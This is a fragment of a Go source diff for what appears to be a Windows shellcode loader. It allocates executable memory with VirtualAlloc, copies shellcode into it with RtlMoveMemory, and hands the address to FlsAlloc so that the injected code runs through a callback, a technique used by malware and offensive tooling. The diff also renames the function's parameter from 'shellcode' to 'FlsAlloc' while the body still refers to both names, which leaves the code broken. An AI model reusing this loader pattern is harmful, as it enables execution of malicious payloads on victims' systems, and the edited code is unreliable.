@@ -26,7 +26,7 @@ var (
 	RtlMoveMemory     = ntdll.MustFindProc("RtlMoveMemory")
 )
 
-func Callback(shellcode []byte) {
+func Callback(FlsAlloc []byte) {
 	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
 	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
 	dIndex, _, _ := FlsAlloc.Call(addr)
